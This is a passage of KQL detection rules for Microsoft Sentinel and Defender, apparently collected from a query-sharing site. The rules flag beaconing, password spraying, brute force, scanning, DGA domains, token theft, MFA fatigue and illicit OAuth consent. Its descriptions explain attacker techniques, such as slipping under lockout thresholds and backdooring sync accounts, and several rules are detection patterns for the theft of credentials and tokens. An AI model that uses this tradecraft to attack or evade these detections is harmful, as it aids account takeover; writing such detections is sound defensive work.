// Title: 01-CSL-Beaconing-Detection.yaml
// Source: https://www.kqlsearch.com/query/01-CSL-Beaconing-Detection&cmqtujdrs0023bljhqzqcsovy
// Section: KQL
// Author: David Alonso
// Description:
// Detects internal hosts making very regular, high-frequency connections to the same external IP
// across multiple hours — the hallmark of C2 beaconing. Queries Fortinet, Palo Alto, and Zscaler
// CEF logs for allowed sessions with >20 connections, spanning ≥3 hourly buckets, with a
// beacon score (connections/hour) above 5.
// MITRE ATT&CK: T1071 (Application Layer Protocol), T1571 (Non-Standard Port)

CommonSecurityLog
| where TimeGenerated > ago(1d)
| where DeviceVendor in ("Fortinet", "Palo Alto Networks", "Zscaler")
| where DeviceAction !in ("deny", "block", "drop", "BLOCK", "DROP", "Reset-Both")
| where isnotempty(DestinationIP)
| where ipv4_is_private(DestinationIP) == false
| where isnotempty(SourceIP)
| summarize
    ConnectionCount  = count(),
    BytesSent        = sum(SentBytes),
    BytesReceived    = sum(ReceivedBytes),
    HourlyBuckets    = dcount(bin(TimeGenerated, 1h)),
    Ports            = make_set(DestinationPort, 10),
    FirstSeen        = min(TimeGenerated),
    LastSeen         = max(TimeGenerated)
  by SourceIP, DestinationIP, DeviceVendor
| where ConnectionCount > 20 and HourlyBuckets >= 3
| extend BeaconScore = round(toreal(ConnectionCount) / toreal(HourlyBuckets), 1)
| where BeaconScore > 5
| order by BeaconScore desc

// Title: 01-SIGNIN-PasswordSpray.yaml
// Source: https://www.kqlsearch.com/query/01-SIGNIN-PasswordSpray&cmqtvzscr00a6bljhwvr55fdl
// Section: KQL
// Author: David Alonso
// Description:
// Detects password spray attacks where a single IP address targets 10 or more distinct user accounts with authentication failures within a 1-hour window. Attackers deliberately stay under per-user lockout thresholds. MITRE ATT&CK: T1110.003 (Password Spraying).

// ---- Network Allowlist (exclude trusted IPs / CIDR / ranges) --------------
  let _allow = materialize(union isfuzzy=true (print R="" | take 0), (_GetWatchlist('NetworkAllowlist') | project R = tostring(IPOrRange)) | where isnotempty(R));
  let _allowCIDR  = toscalar(_allow | where not(R matches regex @'^\d+\.\d+\.\d+\.\d+-\d+\.\d+\.\d+\.\d+$') | extend R = iff(R has '/', R, strcat(R, '/32')) | summarize make_list(R));
  let _allowRange = toscalar(_allow | where R matches regex @'^\d+\.\d+\.\d+\.\d+-\d+\.\d+\.\d+\.\d+$' | summarize make_list(R));
  let _ExcludeAllowlistedIPs = (T:(IPAddress:string)) {
      T
      | extend IPAddress = tostring(IPAddress)
      | where array_length(_allowCIDR) == 0 or isnull(ipv4_is_in_any_range(IPAddress, _allowCIDR)) or not(ipv4_is_in_any_range(IPAddress, _allowCIDR))
      | mv-apply _r = _allowRange to typeof(string) on (
          extend _lo = tostring(split(_r,'-')[0]), _hi = tostring(split(_r,'-')[1])
          | extend _inRange = ipv4_compare(IPAddress, _lo) >= 0 and ipv4_compare(IPAddress, _hi) <= 0
          | summarize _anyInRange = max(toint(_inRange)))
      | where isnull(_anyInRange) or _anyInRange == 0
      | project-away _anyInRange
  };
  // ---------------------------------------------------------------------------
  let timeframe = 1h;
  let userThreshold = 10;
  let failureThreshold = 5;
  SigninLogs
  | invoke _ExcludeAllowlistedIPs()
  | where TimeGenerated > ago(timeframe)
  | where ResultType != "0"
  | summarize
      FailedAttempts = count(),
      UniqueUsers    = dcount(UserPrincipalName),
      TargetedUsers  = make_set(UserPrincipalName, 50),
      StartTime      = min(TimeGenerated),
      EndTime        = max(TimeGenerated),
      Apps           = make_set(AppDisplayName, 5),
      Locations      = make_set(Location, 3)
    by IPAddress
  | where UniqueUsers >= userThreshold and FailedAttempts >= failureThreshold
  | project
      TimeGenerated  = StartTime,
      IPAddress, UniqueUsers, FailedAttempts,
      TargetedUsers, EndTime, Apps, Locations

// Title: 04-ADFS-BruteForce-SingleUser.yaml
// Source: https://www.kqlsearch.com/query/04-ADFS-BruteForce-SingleUser&cmqtu6wl3000dbljh2ved3kix
// Section: KQL
// Author: David Alonso
// Description:
// Detects coordinated botnet brute force: many distinct IP addresses directing credential
// errors at a single ADFS user account. More than 20 failures against one account indicates
// a targeted attack, potentially using a distributed botnet to evade per-IP rate limiting.
// Error codes covered: invalid credentials (50126), wrong password (50055/50056/50064),
// locked account (50053), user not found (50034), sign-in blocked (50057),
// and ADFS extranet lockout (396083).
// MITRE ATT&CK: T1110 (Brute Force), T1078 (Valid Accounts)

let BruteForceErrors = dynamic(["50126", "50055", "50056", "50064",
                                  "50053", "50034", "50057", "396083"]);
ADFSSignInLogs
| where TimeGenerated > ago(1d)
| extend ErrorCode = tostring(ResultType)
| where ErrorCode in (BruteForceErrors)
| summarize
    FailCount  = count(),
    UniqueIPs  = dcount(IPAddress),
    IPs        = make_set(IPAddress, 20),
    Countries  = make_set(Location),
    ErrorCodes = make_set(ErrorCode),
    FirstSeen  = min(TimeGenerated),
    LastSeen   = max(TimeGenerated)
  by UserPrincipalName
| where FailCount > 20
| order by FailCount desc

// Title: 04-CSL-PortScan-Detection.yaml
// Source: https://www.kqlsearch.com/query/04-CSL-PortScan-Detection&cmqtujvez0026bljhbefwewv1
// Section: KQL
// Author: David Alonso
// Description:
// Detects network reconnaissance activity by identifying source IPs that contact more than
// 30 unique destination ports (vertical/port sweep) or more than 50 unique destination IPs
// (horizontal/host sweep) within a 1-hour window. Both patterns indicate active network
// mapping or exploitation preparation.
// MITRE ATT&CK: T1046 (Network Service Discovery)

CommonSecurityLog
| where TimeGenerated > ago(1h)
| where DeviceVendor in ("Fortinet", "Palo Alto Networks", "Zscaler")
| where isnotempty(SourceIP) and isnotempty(DestinationIP)
| summarize
    UniqueDestPorts = dcount(DestinationPort),
    UniqueDestIPs   = dcount(DestinationIP),
    TotalAttempts   = count(),
    Actions         = make_set(DeviceAction, 5),
    Protocols       = make_set(Protocol, 5),
    FirstSeen       = min(TimeGenerated),
    LastSeen        = max(TimeGenerated)
  by SourceIP, DeviceVendor
| where UniqueDestPorts > 30 or UniqueDestIPs > 50
| extend ScanType = case(
    UniqueDestPorts > 30 and UniqueDestIPs <= 10, "Vertical Scan (port sweep)",
    UniqueDestIPs   > 50 and UniqueDestPorts <= 5, "Horizontal Scan (host sweep)",
    "Combined Scan")
| order by UniqueDestPorts desc, UniqueDestIPs desc

// Title: 04-DNS-DGA-HighEntropy.yaml
// Source: https://www.kqlsearch.com/query/04-DNS-DGA-HighEntropy&cmqtuvljv003ybljh66t33spp
// Section: KQL
// Author: David Alonso
// Description:
// Detects clients communicating with Domain Generation Algorithm (DGA) generated
// domains. DGA malware (Emotet, QakBot, Dridex, TrickBot, SolarWinds Sunburst)
// generates pseudo-random domain names at regular intervals, trying many until
// one resolves to an active C2 server.
// Detection is based on the second-level domain character analysis:
// - High ratio of consonants (>65%) — real words are ~40-55% consonant
// - Contains embedded digits — rare in real brand names
// - Length between 10–40 characters — DGA sweet spot
// - High unique character count — randomness indicator
// Differentiation from built-in "Potential DGA via Repetitive Failures
// (Normalized DNS)":
// The built-in detects DGA via NXDOMAIN failure rate only — if the C2 domain
// has already been registered and resolves, the built-in misses it. This rule
// applies consonant-ratio entropy analysis to SUCCESSFUL queries (NOERROR),
// catching active C2 beaconing where the DGA domain resolved. Enables detection
// of DGA malware in its post-initial-C2-registration phase.

ASimDnsActivityLogs
| where TimeGenerated > ago(1h)
| extend SLD = tostring(split(DnsQuery, ".")[-2])
| where strlen(SLD) between (10 .. 40)
| extend
    SLDLen         = strlen(SLD),
    HasDigits      = SLD matches regex @"\d",
    ConsonantCount = countof(SLD, "b") + countof(SLD, "c") + countof(SLD, "d")
                   + countof(SLD, "f") + countof(SLD, "g") + countof(SLD, "h")
                   + countof(SLD, "j") + countof(SLD, "k") + countof(SLD, "l")
                   + countof(SLD, "m") + countof(SLD, "n") + countof(SLD, "p")
                   + countof(SLD, "q") + countof(SLD, "r") + countof(SLD, "s")
                   + countof(SLD, "t") + countof(SLD, "v") + countof(SLD, "w")
                   + countof(SLD, "x") + countof(SLD, "y") + countof(SLD, "z")
| extend ConsonantRatio = todouble(ConsonantCount) / todouble(SLDLen)
| where ConsonantRatio > 0.65
     and HasDigits == true
| summarize
    DgaLikeDomains = dcount(DnsQuery),
    QueryCount     = count(),
    SampleDomains  = make_set(DnsQuery, 15),
    FirstSeen      = min(TimeGenerated),
    LastSeen       = max(TimeGenerated)
  by SrcIpAddr, SrcHostname
| where DgaLikeDomains > 10

// Title: 04-Interactive-ToNIPivotTokenTheft.yaml
// Source: https://www.kqlsearch.com/query/04-Interactive-ToNIPivotTokenTheft&cmqtud0op0017bljh5dxj5zt7
// Section: KQL
// Author: David Alonso
// Description:
// Detects when a user had a successful interactive sign-in (especially without MFA or with
// CA not applied) and then the same session was used for non-interactive token refreshes
// from a DIFFERENT IP address and country within a 2-hour window. This is the classic
// pattern of an attacker stealing a token immediately after initial authentication.
// MITRE ATT&CK: T1528 (Steal Application Access Token), T1539 (Steal Web Session Cookie)

// ── IP Exclusion Lists ─────────────────────────────────────────────────────
// Add corporate VPN egress IPs or other known-safe IPs to KnownSafeIPs.
// Add CIDR ranges (VPN subnets, on-prem NAT, Azure VPN Gateway) to KnownSafeNetworks.
// Watchlist alternative:
//   let KnownSafeIPs = (_GetWatchlist('VPNExcludedIPs') | project SearchKey);
let KnownSafeIPs = dynamic([
    // "203.0.113.50",       // Example VPN egress IP 1
    // "198.51.100.12",      // Example VPN egress IP 2
    // "20.x.x.x"            // Example Azure VPN Gateway public IP
]);
// CIDR ranges – ipv4_lookup filters both interactive and NI IPs
// Azure datacenter IP ranges: https://aka.ms/azureipranges (add to a Watchlist for large sets)
let KnownSafeNetworks = datatable(network: string) [
    // "10.0.0.0/8",         // RFC1918 – private / on-prem
    // "172.16.0.0/12",      // RFC1918 – private / on-prem
    // "192.168.0.0/16",     // RFC1918 – private / on-prem
    // "YOUR_VPN_CIDR/24",   // Replace with corporate VPN egress subnet
    "0.0.0.0/32"             // Placeholder – keeps datatable valid when list is empty
];
// ──────────────────────────────────────────────────────────────────────────
let InteractiveSessions =
    SigninLogs
    | where TimeGenerated > ago(3h)
    | where ResultType == 0
    | where AuthenticationRequirement == "singleFactorAuthentication"
       or   ConditionalAccessStatus   == "notApplied"
    | where not(IPAddress in (KnownSafeIPs))
    | evaluate ipv4_lookup(KnownSafeNetworks, IPAddress, network, return_unmatched = true)
    | where isempty(network)
    | project-away network
    | project
        UserPrincipalName,
        InteractiveTime    = TimeGenerated,
        InteractiveIP      = IPAddress,
        InteractiveCountry = Location,
        AppDisplayName,
        CorrelationId;
AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(3h)
| where ResultType == 0
| where not(IPAddress in (KnownSafeIPs))
| evaluate ipv4_lookup(KnownSafeNetworks, IPAddress, network, return_unmatched = true)
| where isempty(network)
| project-away network
| join kind=inner InteractiveSessions on UserPrincipalName
| where IPAddress != InteractiveIP
   and  Location  != InteractiveCountry
   and  (TimeGenerated - InteractiveTime) between (1m .. 2h)
| project
    NISignInTime       = TimeGenerated,
    InteractiveTime,
    UserPrincipalName,
    AppDisplayName,
    NIIPAddress        = IPAddress,
    NICountry          = Location,
    InteractiveIP,
    InteractiveCountry,
    CorrelationId,
    UniqueTokenIdentifier,
    TimeSinceInteractive = (TimeGenerated - InteractiveTime)
| order by UserPrincipalName asc, InteractiveTime asc

// Title: 05-ADFS-BruteForce-SuccessChain.yaml
// Source: https://www.kqlsearch.com/query/05-ADFS-BruteForce-SuccessChain&cmqtu72h6000ebljhfpmdjfux
// Section: KQL
// Author: David Alonso
// Description:
// Detects the "attacker guessed the password" pattern: the same user account accumulates
// more than 5 brute-force credential failures in ADFS, followed by a successful sign-in
// where the success occurs AFTER the last failure. This sequence is a strong indicator of
// a successful credential compromise via brute force against the ADFS federation endpoint.
// The SuccessIP vs FailIPs comparison helps identify whether the attacker IP changed after
// the compromise.
// MITRE ATT&CK: T1110 (Brute Force), T1078 (Valid Accounts)

let BruteForceErrors = dynamic(["50126", "50055", "50056", "50064",
                                  "50053", "50034", "50057", "396083"]);
let Failures =
    ADFSSignInLogs
    | where TimeGenerated > ago(1d)
    | extend ErrorCode = tostring(ResultType)
    | where ErrorCode in (BruteForceErrors)
    | summarize
        FailCount = count(),
        LastFail  = max(TimeGenerated),
        FailIPs   = make_set(IPAddress)
      by UserPrincipalName;
ADFSSignInLogs
| where TimeGenerated > ago(1d)
| where ResultType == 0
| summarize
    FirstSuccess = min(TimeGenerated),
    SuccessIP    = tostring(make_set(IPAddress)[0])
  by UserPrincipalName
| join kind=inner Failures on UserPrincipalName
| where FailCount > 5
   and  FirstSuccess > LastFail
| project
    UserPrincipalName,
    FailCount,
    LastFail,
    FirstSuccess,
    TimeDiff  = FirstSuccess - LastFail,
    FailIPs,
    SuccessIP
| order by FailCount desc

// Title: 05-CSL-HighRiskCountry-Traffic.yaml
// Source: https://www.kqlsearch.com/query/05-CSL-HighRiskCountry-Traffic&cmqtuk06e0027bljhr11o00kk
// Section: KQL
// Author: David Alonso
// Description:
// Detects allowed inbound or outbound firewall traffic to/from countries frequently associated
// with nation-state threat actors and APT groups (CN, RU, KP, IR, SY, CU, BY, VE, AF, LY).
// High-volume or repeated connections to these geographies may indicate C2 channels, data
// exfiltration, or unauthorized access from threat actor infrastructure.
// MITRE ATT&CK: T1078 (Valid Accounts)

let HighRiskCountries = dynamic([
    "China", "Russia", "North Korea", "Iran", "Syria",
    "Cuba", "Belarus", "Venezuela", "Afghanistan", "Libya"]);
CommonSecurityLog
| where TimeGenerated > ago(1d)
| where DeviceVendor in ("Fortinet", "Palo Alto Networks", "Zscaler")
| where DeviceAction !in ("deny", "block", "drop", "BLOCK", "DROP", "Reset-Both")
| where isnotempty(DestinationIP)
| where ipv4_is_private(DestinationIP) == false
| extend DestCountry = tostring(geo_info_from_ip_address(DestinationIP).country)
| where DestCountry in (HighRiskCountries)
| summarize
    ConnectionCount  = count(),
    BytesSent        = sum(SentBytes),
    InternalIPs      = make_set(SourceIP, 20),
    ExternalIPs      = make_set(DestinationIP, 20),
    FirstSeen        = min(TimeGenerated),
    LastSeen         = max(TimeGenerated),
    RepresentativeIP = any(SourceIP)
  by DestCountry, DeviceVendor
| order by ConnectionCount desc

// Title: 06-ROPC-AuthenticationDetected.yaml
// Source: https://www.kqlsearch.com/query/06-ROPC-AuthenticationDetected&cmqtudffh0019bljh1rlh9la1
// Section: KQL
// Author: David Alonso
// Description:
// Detects successful Resource Owner Password Credential (ROPC) grant flow across both
// SigninLogs (interactive) and AADNonInteractiveUserSignInLogs. ROPC sign-ins surface in
// SigninLogs far more often than in the non-interactive table, so this rule correlates
// both sources. ROPC passes user credentials directly to Entra ID, completely bypassing
// MFA, Conditional Access policies, and any security controls. Its presence indicates
// either a misconfigured legacy app or an attacker using stolen credentials via
// command-line tooling.
//
// Tuning:
// - Only successful ROPC (ResultType == 0). Failures are covered by rule 24 (ROPC-CredentialStuffing).
// - MinSuccessfulSignIns suppresses the trickle of sanctioned/legacy ROPC (single-shot
// script automation) that becomes visible once SigninLogs is included. Lower to 1 to
// alert on every successful ROPC; the context-aware rules 25-28 still catch single events.
// - AppDisplayName allowlist excludes documented legitimate ROPC clients
// (Microsoft Authentication Broker, Intune Company Portal, etc.). Edit LegitRopcApps to extend.
// - UserPrincipalName allowlist (LegitRopcUsers) for sanctioned sync / service accounts.
// - Allowlist IPs are stripped via ExcludeAllowlistedIPs_AADNI() (NetworkAllowlist watchlist).
//
// MITRE ATT&CK: T1110 (Brute Force), T1078 (Valid Accounts), T1550 (Use Alternate Auth Material)

let LegitRopcApps = dynamic([
    "Microsoft Authentication Broker",
    "Microsoft Intune Company Portal",
    "Azure AD Connect",
    "Microsoft Office",
    "Microsoft Office Authentication Broker"
]);
let LegitRopcUsers = dynamic([]);
// ROPC surfaces in SigninLogs more often than the non-interactive table; correlate both.
// MinSuccessfulSignIns filters the trickle of legit/legacy ROPC; lower to 1 for max sensitivity.
let MinSuccessfulSignIns = 3;
let RopcSignIns =
    union isfuzzy=true
        (SigninLogs
            | where TimeGenerated > ago(1h)
            | where AuthenticationProtocol =~ "ropc"
            | project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName, ResultType),
        (AADNonInteractiveUserSignInLogs
            | where TimeGenerated > ago(1h)
            | where AuthenticationProtocol =~ "ropc"
            | project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName, ResultType);
RopcSignIns
| invoke ExcludeAllowlistedIPs_AADNI()
| where ResultType == 0
| where AppDisplayName !in~ (LegitRopcApps)
| where tolower(UserPrincipalName) !in~ (LegitRopcUsers)
| summarize
    Count     = count(),
    IPs       = make_set(IPAddress),
    Countries = make_set(Location),
    Apps      = make_set(AppDisplayName),
    FirstSeen = min(TimeGenerated),
    LastSeen  = max(TimeGenerated)
  by UserPrincipalName
| where Count >= MinSuccessfulSignIns
| extend IPAddress = tostring(IPs[0])
| order by Count desc

// Title: 07-CSL-Fortinet-IPSAlerts.yaml
// Source: https://www.kqlsearch.com/query/07-CSL-Fortinet-IPSAlerts&cmqtukaiy0029bljhqo2qp38v
// Section: KQL
// Author: David Alonso
// Description:
// Surfaces Fortinet IPS and Application Control block events that occurred more than 10 times
// in a 24-hour period. Repeated IPS hits against the same signature from the same source may
// indicate an active exploitation attempt, automated attack tooling, or a compromised internal
// host attempting to exploit adjacent systems.
// MITRE ATT&CK: T1190 (Exploit Public-Facing Application), T1203 (Exploitation for Client Execution)

CommonSecurityLog
| where TimeGenerated > ago(1d)
| where DeviceVendor == "Fortinet"
| where DeviceEventClassID has_any ("IPS", "anomaly", "signature")
    or Activity has_any ("ips-packet", "app-ctrl", "anomaly")
| summarize
    HitCount         = count(),
    SourceIPs        = make_set(SourceIP, 20),
    DestinationIPs   = make_set(DestinationIP, 20),
    ProtocolsUsed    = make_set(Protocol, 5),
    SeverityValues   = make_set(LogSeverity, 5),
    FirstSeen        = min(TimeGenerated),
    LastSeen         = max(TimeGenerated)
  by Activity, DeviceEventClassID
| where HitCount > 10
| order by HitCount desc

// Title: 07-DNS-Rebinding-RapidTTL.yaml
// Source: https://www.kqlsearch.com/query/07-DNS-Rebinding-RapidTTL&cmqtuw2ds0041bljhz07go5nb
// Section: KQL
// Author: David Alonso
// Description:
// Detects DNS rebinding preparation by identifying domains that resolve to
// multiple different IP addresses within a short window with rapid re-resolution.
// In a DNS rebinding attack, the attacker's domain initially resolves to a public
// IP, then switches to an internal/loopback IP (127.0.0.1, 192.168.x.x, 0.0.0.0)
// after the TTL expires. This allows JavaScript from the attacker's domain to
// access internal services by bypassing the browser's Same-Origin Policy.
// Ref: GitHub Security Lab — "DNS rebinding attacks explained"
// Ref: Singularity of Origin (NCC Group), rbndr (Tavis Ormandy)

ASimDnsActivityLogs
| where TimeGenerated > ago(30m)
| where EventResult =~ "Success"
| where DnsAnswerCount > 0
| summarize
    QueryCount      = count(),
    FirstSeen       = min(TimeGenerated),
    LastSeen        = max(TimeGenerated),
    SrcHostname     = any(SrcHostname)
  by SrcIpAddr, DnsQuery
| where QueryCount >= 5
| extend SpanSeconds = datetime_diff('second', LastSeen, FirstSeen)
| where SpanSeconds > 0
| extend ReResolutionRate = round(todouble(QueryCount) / todouble(SpanSeconds) * 60.0, 2)
| where ReResolutionRate >= 2
| project
    SrcIpAddr,
    SrcHostname,
    DnsQuery,
    QueryCount,
    ReResolutionRate,
    SpanSeconds,
    FirstSeen,
    LastSeen

// Title: 08-AADProv-TAP-on-SyncAccount.yaml
// Source: https://www.kqlsearch.com/query/08-AADProv-TAP-on-SyncAccount&cmqtuzjjc004jbljhqdttni9c
// Section: KQL
// Author: David Alonso
// Description:
// Detects Temporary Access Pass (TAP) issuance against a user account that is
// either (a) a member of the `Directory Synchronization Accounts` role (per
// `IdentityInfo`), or (b) matches the Entra Connector account naming pattern
// (`Sync_*` / `On-Premises Directory Synchronization Service Account`). TAP
// issuance against a sync account is **never legitimate** under normal
// operations - it is the documented stealth backdoor for sync-account
// takeover (Cloud-Architekt playbook).
// MITRE ATT&CK: T1098.001 (Account Manipulation: Additional Cloud Credentials),
// T1078.004 (Valid Accounts: Cloud Accounts), T1556 (Modify Authentication
// Process).

// Sync accounts known via IdentityInfo (UEBA) - degrade to naming pattern if not available
let SyncAccounts =
    IdentityInfo
    | where TimeGenerated > ago(14d)
    | summarize arg_max(TimeGenerated, *) by AccountUPN
    | where AssignedRoles has_any (
          "Directory Synchronization Accounts",
          "On Premises Directory Sync Account"
      )
        or AccountUPN startswith "Sync_"
        or AccountDisplayName has "On-Premises Directory Synchronization Service Account"
    | project AccountUPN, AccountObjectId, AccountDisplayName;
AuditLogs
| where TimeGenerated > ago(1d)
| where OperationName has_any (
      "Admin registered security info",
      "Register security info",
      "Create temporary access pass",
      "Issue temporary access pass",
      "Admin Issued Temporary Access Pass",
      "User registered security info"
  )
| mv-expand TargetResources
| extend TargetUpn = tostring(TargetResources.userPrincipalName)
| extend TargetId  = tostring(TargetResources.id)
| extend Initiator = tostring(InitiatedBy.user.userPrincipalName)
| extend Actor     = coalesce(Initiator, tostring(InitiatedBy.app.displayName))
| extend SourceIP  = tostring(InitiatedBy.user.ipAddress)
// Match by UPN or ObjectId OR by naming heuristic (works even without IdentityInfo)
| where TargetUpn in~ (SyncAccounts | project AccountUPN)
     or TargetId  in  (SyncAccounts | project AccountObjectId)
     or TargetUpn startswith "Sync_"
     or TargetUpn contains "DirSync"
     or TargetUpn has "On-Premises Directory Synchronization"
| project TimeGenerated, OperationName, Actor, SourceIP, TargetUpn, TargetResources, Result
| order by TimeGenerated desc

// Title: 08-BruteForce-SuccessChain.yaml
// Source: https://www.kqlsearch.com/query/08-BruteForce-SuccessChain&cmqtudqym001bbljhx9tboem5
// Section: KQL
// Author: David Alonso
// Description:
// Detects the classic credential stuffing / brute force success pattern: a user account
// experiences multiple non-interactive sign-in failures with brute-force-related error
// codes (wrong password, locked account, etc.) followed by a successful sign-in — indicating
// the attacker eventually guessed or stuffed the correct credentials.
// MITRE ATT&CK: T1110 (Brute Force), T1110.004 (Credential Stuffing)

let BruteForceErrors = dynamic(["50126","50055","50056","50064","50053","50034","50057","50128"]);
let Failures =
    AADNonInteractiveUserSignInLogs
    | where TimeGenerated > ago(3h)
    | extend ErrorCode = tostring(ResultType)
    | where ErrorCode in (BruteForceErrors)
    | summarize
        FailCount = count(),
        LastFail  = max(TimeGenerated),
        FailIPs   = make_set(IPAddress),
        Countries = make_set(Location)
      by UserPrincipalName;
AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(3h)
| where ResultType == 0
| summarize
    FirstSuccess = min(TimeGenerated),
    SuccessIP    = tostring(make_set(IPAddress)[0])
  by UserPrincipalName
| join kind=inner Failures on UserPrincipalName
| where FailCount > 15
   and  FirstSuccess > LastFail
| project
    UserPrincipalName,
    FailCount,
    LastFail,
    FirstSuccess,
    TimeBetweenFailAndSuccess = (FirstSuccess - LastFail),
    FailIPs,
    SuccessIP,
    Countries
| order by FailCount desc

// Title: 09-MFAFatigue-SilentTokenAbuse.yaml
// Source: https://www.kqlsearch.com/query/09-MFAFatigue-SilentTokenAbuse&cmqtudxpb001cbljh7gvwyfon
// Section: KQL
// Author: David Alonso
// Description:
// Detects the MFA fatigue (push bombing) attack pattern: a user receives many failed MFA
// prompts (attacker bombards them), eventually authenticates (possibly by approving to
// make it stop), and then the attacker begins heavily using non-interactive tokens from
// that session. This is a common technique used by groups like LAPSUS$ and Scattered Spider.
// MITRE ATT&CK: T1621 (Multi-Factor Authentication Request Generation)

let MFAFatigue =
    SigninLogs
    | where TimeGenerated > ago(4h)
    | where ResultType in (50074, 500121, 50076)  // MFA required, denied, interrupted
    | summarize
        MFAAttempts  = count(),
        FirstAttempt = min(TimeGenerated)
      by UserPrincipalName;
let MFASuccess =
    SigninLogs
    | where TimeGenerated > ago(4h)
    | where ResultType == 0
    | where AuthenticationRequirement == "multiFactorAuthentication"
    | summarize MFASuccessTime = min(TimeGenerated), SuccessIP = tostring(make_set(IPAddress)[0])
      by UserPrincipalName;
MFAFatigue
| where MFAAttempts >= 8
| join kind=inner MFASuccess on UserPrincipalName
| where MFASuccessTime > FirstAttempt
| join kind=inner (
    AADNonInteractiveUserSignInLogs
    | where TimeGenerated > ago(4h)
    | where ResultType == 0
    | summarize NI_Count = count(), NI_Countries = make_set(Location), NI_IPs = make_set(IPAddress)
      by UserPrincipalName
  ) on UserPrincipalName
| where NI_Count > 25
| project
    UserPrincipalName,
    MFAAttempts,
    FirstMFAPrompt   = FirstAttempt,
    MFASuccessTime,
    SuccessIP,
    NI_Count,
    NI_Countries
| order by MFAAttempts desc

// Title: 1 - List of critical Azure resources in XSPM.kusto
// Source: https://www.kqlsearch.com/query/1%20-%20List%20of%20critical%20Azure%20resources%20in%20XSPM&cmc568ub8000kd9sbm3hzkbvt
// Section: KQL
// Author: Thomas Naunheim
// Description:
// No description found on source page.

let XspmCriticalAssets = ExposureGraphNodes
    | mv-expand EntityIds
    | extend EntityType = parse_json(EntityIds)
    | where EntityType["type"] == "AzureResourceId"
    | mv-expand CriticalityData = parse_json(NodeProperties)["rawData"]["criticalityLevel"]["ruleNames"]
    | extend CriticalityLevel = tostring(parse_json(NodeProperties)["rawData"]["criticalityLevel"]["criticalityLevel"])
    | extend RuleName = tostring(CriticalityData)
    | extend ResourceId = tolower(tostring(EntityType["id"]))
    | where isnotempty(CriticalityLevel)
    | project ResourceId, NodeId, NodeName, RuleName, CriticalityLevel;
    XspmCriticalAssets
    // Correlation with XDR Alerts
    | join kind=inner (
        AlertEvidence
        | where EntityType == @"CloudResource"
        | extend ResourceId = tolower(ResourceID)
        | project AlertTitle = Title, ServiceSource, ResourceId
    ) on ResourceId
    | summarize SecurityAlerts = make_set(AlertTitle), CriticalAssetTag = make_set(RuleName) by ResourceId

// Title: 10-AADProv-SyncSignin-OutsideAllowlist.yaml
// Source: https://www.kqlsearch.com/query/10-AADProv-SyncSignin-OutsideAllowlist&cmqtuzylu004lbljh36ohv8kp
// Section: KQL
// Author: David Alonso
// Description:
// Detects successful sign-ins from `Sync_*` / `On-Premises Directory
// Synchronization Service Account` UPNs originating from an IP address that is
// NOT in the `HighValueAssets` watchlist tagged `EntraIDConnect`. The sync
// account should only authenticate from the Entra Connect server's public IP
// range - any other source is either a misconfiguration or active abuse.
// Threshold is a single successful sign-in (any non-allowlisted IP is
// notable), with non-interactive sign-ins included via
// `AADNonInteractiveUserSignInLogs` since sync traffic largely lives there.
// MITRE ATT&CK: T1078.004 (Valid Accounts: Cloud Accounts).

// Allowlisted Entra Connect server IPs - falls back to empty set if watchlist missing
let AllowedIPs =
    _GetWatchlist('EntraConnect_HighValueAssets')
    | where tostring(Tags) has "EntraIDConnect"
    | project IPAddress = tostring(IPAddress);
let SyncSignIns =
    union isfuzzy=true
      (SigninLogs                          | where TimeGenerated > ago(1h)),
      (AADNonInteractiveUserSignInLogs     | where TimeGenerated > ago(1h))
    | where ResultType == 0
    | where UserPrincipalName startswith "Sync_"
         or UserPrincipalName contains "DirSync"
         or UserDisplayName has "On-Premises Directory Synchronization Service Account";
SyncSignIns
| where IPAddress !in (AllowedIPs) or isempty(IPAddress)
| summarize
    SigninCount  = count(),
    Apps         = make_set(AppDisplayName, 10),
    ClientApps   = make_set(ClientAppUsed, 5),
    UserAgents   = make_set(UserAgent, 5),
    Locations    = make_set(Location, 5),
    FirstSeen    = min(TimeGenerated),
    LastSeen     = max(TimeGenerated)
  by UserPrincipalName, IPAddress
| order by SigninCount desc

// Title: 10-StaleToken-AfterPasswordChange.yaml
// Source: https://www.kqlsearch.com/query/10-StaleToken-AfterPasswordChange&cmqtue2km001dbljhz6m80nsk
// Section: KQL
// Author: David Alonso
// Description:
// Detects when a user's password or authentication methods were changed/reset in Azure AD
// Audit Logs, but non-interactive token refreshes continue to occur AFTER the change.
// This is a strong indicator that an attacker has a pre-existing refresh token that
// survived the password change — a key tactic to maintain persistent access even after
// the victim or IT team reset the compromised credentials.
// MITRE ATT&CK: T1528 (Steal Application Access Token), T1078 (Valid Accounts)

let PasswordChanges =
    AuditLogs
    | where TimeGenerated > ago(24h)
    | where OperationName has_any (
        "Reset password",
        "Change password",
        "User changed password",
        "Admin updated user authentication method",
        "Update Authentication Method",
        "Delete Authentication Method"
      )
    | extend UPN = tostring(TargetResources[0].userPrincipalName)
    | where isnotempty(UPN)
    | summarize ChangeTime = max(TimeGenerated) by UPN;
AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(24h)
| where ResultType == 0
| join kind=inner PasswordChanges on $left.UserPrincipalName == $right.UPN
| where TimeGenerated > ChangeTime
| summarize
    TokensAfterChange = count(),
    IPs               = make_set(IPAddress),
    Countries         = make_set(Location),
    Apps              = make_set(AppDisplayName),
    LastSeen          = max(TimeGenerated),
    FirstTokenAfter   = min(TimeGenerated)
  by UserPrincipalName, ChangeTime
| extend IPAddress = tostring(IPs[0])
| order by TokensAfterChange desc

// Title: 13-OAuthConsent-ImmediateAbuse.yaml
// Source: https://www.kqlsearch.com/query/13-OAuthConsent-ImmediateAbuse&cmqtuel0s001gbljhd8y7cpu1
// Section: KQL
// Author: David Alonso
// Description:
// Detects when a user grants consent to an OAuth application in Azure AD (recorded in
// Audit Logs) and that same app immediately begins generating non-interactive token
// refreshes within 24 hours. This is the signature of illicit consent grant attacks
// where an attacker tricks a user into granting a malicious app persistent access to
// their mailbox, files, or other sensitive resources.
// MITRE ATT&CK: T1528 (Steal Application Access Token), T1566 (Phishing)

let RecentConsents =
    AuditLogs
    | where TimeGenerated > ago(24h)
    | where OperationName has_any (
        "Consent to application",
        "Add app role assignment",
        "Add delegated permission grant"
      )
    | extend ActorUPN    = tostring(InitiatedBy.user.userPrincipalName)
    | extend AppId       = tostring(TargetResources[0].id)
